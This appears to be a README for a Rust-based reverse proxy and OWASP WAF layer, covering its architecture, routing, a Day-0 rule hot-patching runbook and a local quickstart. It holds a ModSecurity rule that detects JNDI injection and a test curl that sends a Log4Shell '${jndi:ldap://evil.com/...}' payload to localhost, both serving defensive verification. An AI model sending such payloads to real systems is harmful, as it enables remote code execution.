# ferrous-reverseproxy

[← Back to FerrousCX Root Architecture](https://github.com/reidlai/ferrous-cx)

> **Edge Reverse Proxy, TLS Termination & OWASP WAF Stack for FerrousCX Platform**  
> Powered by [Zentinel](https://github.com/zentinelproxy/zentinel), an enterprise-grade, memory-safe reverse proxy written in pure Rust on top of Cloudflare's **Pingora** framework, featuring crash-isolated security agents, native OWASP Core Rule Set (CRS) enforcement via `zentinelsec`, and zero-downtime Day-0 ad-hoc rule hot-patching.

---

## 🎯 Architectural Role

`ferrous-reverseproxy` acts as the single secure entry point and edge perimeter gatekeeper for the entire FerrousCX ecosystem:

1. **Edge TLS Termination:** Terminates client TLS (HTTPS) using modern cipher suites and forwards clean HTTP traffic to internal backend services.
2. **Reverse Proxy & Routing:** Routes public web traffic to the Svelte 5 frontend (`ferrous-frontend`), API mutations & Server-Sent Events to the Axum gateway (`ferrous-api`), and OIDC authentication flows to Kanidm (`ferrous-iam`).
3. **Unbuffered Streaming (Axum SSE):** Leverages Pingora's asynchronous zero-copy streaming core to forward long-lived Server-Sent Events (`GET /api/v1/events/stream`) without chunk buffering or premature connection drops.
4. **OWASP Core Rule Set (CRS) WAF:** Integrates `zentinel-modsec` and `zentinelsec` (pure-Rust ModSecurity rule parser with zero C dependencies) to inspect request headers, query strings, and payloads against OWASP CRS v3/v4.
5. **Day-0 Ad-Hoc Hot-Patching:** Enables immediate mitigation of zero-day exploits (e.g. Log4j, Spring4Shell, header injections) via live SecRule DSL or Cedar policy updates without restarting the proxy daemon.
6. **Crash-Isolated Agent Pipeline:** Security inspection rules execute in isolated memory boundaries. An edge-case exploit or parser crash in a WAF filter restarts the agent process gracefully without dropping client connections or the core proxy daemon.

```text
                                  ┌───────────────────────────────┐
                                  │      CLIENTS / BROWSERS       │
                                  │  (Svelte 5 UI, Mobile, APIs)  │
                                  └──────────────┬────────────────┘
                                                 │ HTTPS (443 / 8443)
                                                 ▼
┌─────────────────────────────────────────────────────────────────────────────────────────────────┐
│ ferrous-reverseproxy (Zentinel on Cloudflare Pingora Core)                                      │
│                                                                                                 │
│  ┌───────────────────────┐   ┌───────────────────────────────┐   ┌───────────────────────────┐  │
│  │ TLS Termination       │   │ OWASP WAF Engine              │   │ Day-0 Ad-Hoc DSL Hot-Swap │  │
│  │ (Rustls / OpenSSL)    │──►│ (zentinelsec Pure-Rust CRS)   │──►│ (/etc/zentinel/rules.d/)  │  │
│  └───────────────────────┘   └───────────────────────────────┘   └───────────────────────────┘  │
│                                              │                                                  │
│                                              ▼ Streaming Proxy Engine (Zero Buffering)          │
└───────────────────┬──────────────────────────┼──────────────────────────────┬───────────────────┘
                    │                          │                              │
                    │ /                        │ /api/v1/*                    │ /oauth2/*, /idp/*
                    ▼                          ▼                              ▼
      ┌───────────────────────────┐ ┌───────────────────────────┐ ┌───────────────────────────┐
      │ ferrous-frontend          │ │ ferrous-api               │ │ ferrous-iam               │
      │ (Svelte 5 Static / SSR)   │ │ (Rust / Axum + Axum SSE)  │ │ (Kanidm Pure-Rust IdP)    │
      │ Port: 5173                │ │ Port: 8080                │ │ Port: 8443                │
      └───────────────────────────┘ └───────────────────────────┘ └───────────────────────────┘
```

---

## ⚖️ Why Zentinel? (Pros & Cons Analysis)

During our architectural selection and technical recon, we evaluated five candidate reverse proxy stacks against FerrousCX's strict requirements:
1. **Pure-Rust memory safety** aligning with the platform's 100% Rust ethos.
2. **Turnkey ready-to-run binary** (minimal custom networking glue).
3. **OWASP Core Rule Set (CRS v3/v4)** compatibility.
4. **Day-0 ad-hoc rule hot-patching** without downtime.
5. **Modern protocol support** (HTTP/1.1, HTTP/2, HTTP/3).

### Comparative Evaluation Matrix

| Candidate | Language & Core | Ready-to-Run Binary | OWASP WAF (CRS) | Day-0 Rule Hot-Reload | HTTP/1.1 & HTTP/2 | HTTP/3 (QUIC) | Architectural Fit |
| :--- | :--- | :---: | :---: | :---: | :---: | :---: | :--- |
| **Zentinel** | **Rust (Pingora)** | **Yes** | **Yes (`zentinelsec`)** | **Yes (SecRule/Cedar/WASM)** | **Yes** | ⚠️ Roadmap | **Optimal (Winner)** |
| **River** | Rust (Pingora) | **Yes** | ❌ (No engine) | ⚠️ (KDL reload only) | **Yes** | ⚠️ Roadmap | Moderate |
| **`rpxy`** | Rust (Hyper/Quinn) | **Yes** | ❌ (No WAF) | ❌ (Static routes) | **Yes** | **Yes (Native)** | Low (No security layer) |
| **Sōzu** | Rust (mio) | **Yes** | ❌ (No WAF) | ⚠️ (Control socket) | **Yes** | ❌ (Non-goal) | Low (No WAF/H3) |
| **Envoy + Coraza** | C++ / WASM | **Yes** | **Yes (Coraza WASM)** | **Yes (xDS / WASM)** | **Yes** | **Yes (Production)** | Breaks 100% Rust purity |

### Pros of Zentinel for FerrousCX
* **100% Rust-Native Purity:** Built on Cloudflare Pingora, maintaining the platform's strict end-to-end memory-safety guarantee alongside Kanidm, Axum, Rig, Iggy, Arroyo, DataFusion, and Qdrant.
* **Built-in Pure-Rust OWASP CRS Engine:** `zentinelsec` implements the ModSecurity rule language natively in safe Rust with **zero C/C++ dependencies**, allowing static binary compilation without fragile FFI linking.
* **Crash-Isolated Agent Architecture:** Unlike monolithic proxies where a regex engine panic crashes the entire daemon, Zentinel isolates security inspection inside agent processes that restart automatically while maintaining active network streams.
* **Native SSE Compatibility:** Streaming proxy engine does not buffer response chunks, allowing `ferrous-api`'s Axum SSE streams (`GET /api/v1/events/stream`) to pass tokens to Svelte 5 with microsecond latency.
* **OIDC & IAM Synergy:** Provides out-of-the-box JWT validation and OIDC agents, allowing edge authorization checks against `ferrous-iam` (Kanidm).

### Cons & Known Trade-Offs
* **HTTP/3 (QUIC) is Currently on Roadmap:** Because upstream Cloudflare Pingora designed its core for edge-to-origin TCP transit, HTTP/3 reverse proxy listeners are still in progress upstream. Zentinel guards against `protocol = "h3"` at startup.
  * **Mitigation Strategy:** 
    1. *Phase 1 (MVP):* Terminate TLS over HTTP/1.1 and HTTP/2. For browser clients and Axum SSE streams, HTTP/2 provides multiplexing and header compression with exceptional responsiveness.
    2. *Phase 2 (Upstream Pingora Release):* Enable native `h3` in Zentinel configuration once Pingora merges QUIC transport, with zero changes to WAF rules or backend services.
    3. *Optional Edge QUIC Terminator:* If HTTP/3 is strictly required on Day 1, run a lightweight edge terminator (`rpxy` or cloud ALB) forwarding HTTP/2 to Zentinel.
* **Emerging Ecosystem:** Zentinel is a newer, rapidly moving project compared to legacy veterans like Nginx or Envoy, though it builds directly on Cloudflare's battle-tested Pingora.

---

## 🔌 Routing & Contract Specifications

Zentinel listens on port `443` (HTTPS) and `80` (HTTP redirect to HTTPS):

| Ingress Route | Upstream Service | Protocol | Security Inspection | Streaming Policy |
| :--- | :--- | :--- | :--- | :--- |
| `GET /` | `ferrous-frontend:5173` | HTTP/2 | OWASP CRS Baseline | Static Caching |
| `GET /_app/*` | `ferrous-frontend:5173` | HTTP/2 | Static asset whitelist | Long-lived client cache |
| `POST /api/v1/commands/*` | `ferrous-api:8080` | HTTP/2 | Deep JSON inspect, CRS, Day-0 | Immediate pass-through |
| `GET /api/v1/events/stream` | `ferrous-api:8080` | HTTP/2 | Header inspect, bypass body WAF | **Unbuffered Chunked SSE** |
| `GET /api/v1/query/*` | `ferrous-api:8080` | HTTP/2 | SQLi CRS checks, Token auth | Standard buffering |
| `POST /v1/chat/completions` | `ferrous-agent:8081` | HTTP/2 | Prompt-injection rules, CRS | Unbuffered streaming |
| `/oauth2/*`, `/idp/*` | `ferrous-iam:8443` | HTTPS | OIDC passthrough & TLS SNI | Direct TLS forward |

---

## 🛡️ Day-0 Ad-Hoc Rule Hot-Patching Runbook

When a critical zero-day vulnerability (e.g. Log4j JNDI exploit, Spring4Shell, header injection attack) is discovered, apply instant network-level mitigation without restarting the proxy:

### 1. Create the Hot-Patch Rule File
Create or append to `/etc/zentinel/rules.d/day0-mitigations.conf`:

```apache
# /etc/zentinel/rules.d/day0-mitigations.conf
# Mitigate Day-0 Remote Code Execution (RCE) / JNDI Exploit
SecRule REQUEST_HEADERS|REQUEST_URI|REQUEST_BODY "@rx (?i)\$\{jndi:(?:ldap|rmi|dns):" \
    "id:9990001,\
     phase:2,\
     deny,\
     status:403,\
     log,\
     msg:'[FERROUS-DAY0] JNDI Injection Exploit Blocked',\
     tag:'CVE-2021-44228',\
     severity:'CRITICAL'"
```

### 2. Trigger Zero-Downtime Rule Reload
Zentinel automatically detects file system modifications in `/etc/zentinel/rules.d/`, or you can send a SIGHUP signal:

```bash
docker exec -it ferrous-reverseproxy kill -HUP 1
```

Active client SSE connections and in-flight transactions remain uninterrupted.

---

## 📁 Repository Layout

```text
ferrous-reverseproxy/
├── .github/workflows/
│   └── devsecops-ci.yml        # Tier 2 Container CI (trivy scan, hadolint, smoke test)
├── .pre-commit-config.yaml      # Pre-commit hooks (gitleaks, prettier, shellcheck)
├── config/
│   ├── zentinel.yaml           # Core proxy topology, listeners, and upstreams
│   ├── crs/                    # OWASP Core Rule Set v4 rule definitions
│   │   ├── REQUEST-901-INITIALIZATION.conf
│   │   ├── REQUEST-941-APPLICATION-ATTACK-XSS.conf
│   │   └── REQUEST-942-APPLICATION-ATTACK-SQLI.conf
│   └── rules.d/                # Directory for dynamic Day-0 ad-hoc SecRules
│       └── day0-mitigations.conf
├── Dockerfile                  # Multi-stage distroless / minimal Rust build
└── README.md                   # This document
```

---

## 🛠️ Developer Quickstart

### 1. Run via Docker Locally
```bash
# Build the container locally
docker build -t ferrous-reverseproxy:latest .

# Run standalone mapped to local ports
docker run -d \
  --name ferrous-reverseproxy \
  -p 80:80 \
  -p 443:443 \
  -v $(pwd)/config:/etc/zentinel:ro \
  ferrous-reverseproxy:latest
```

### 2. Verify WAF Protection
```bash
# Legitimate API request (Should return HTTP 200/202)
curl -k -i https://localhost/api/v1/commands/orders/issue-credit \
  -H "Content-Type: application/json" \
  -d '{"order_id":"test","amount":15.00}'

# Malicious Day-0 exploit attempt (Should return HTTP 403 Forbidden)
curl -k -i https://localhost/api/v1/commands/orders/issue-credit \
  -H "X-Forwarded-For: \${jndi:ldap://evil.com/a}"
```

